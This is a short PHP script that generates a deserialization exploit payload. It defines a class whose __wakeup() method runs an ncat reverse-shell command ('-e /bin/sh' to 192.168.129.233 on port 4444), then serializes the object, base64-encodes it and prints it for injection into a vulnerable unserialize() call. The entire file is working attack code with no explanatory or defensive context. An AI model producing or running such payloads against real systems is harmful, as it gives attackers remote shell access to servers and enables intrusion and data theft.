<?php
class MaliciousUserData {
public $command = 'ncat -nv 192.168.129.233 4444 -e /bin/sh';
public function __wakeup() { 
    exec($this->command);
    }
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>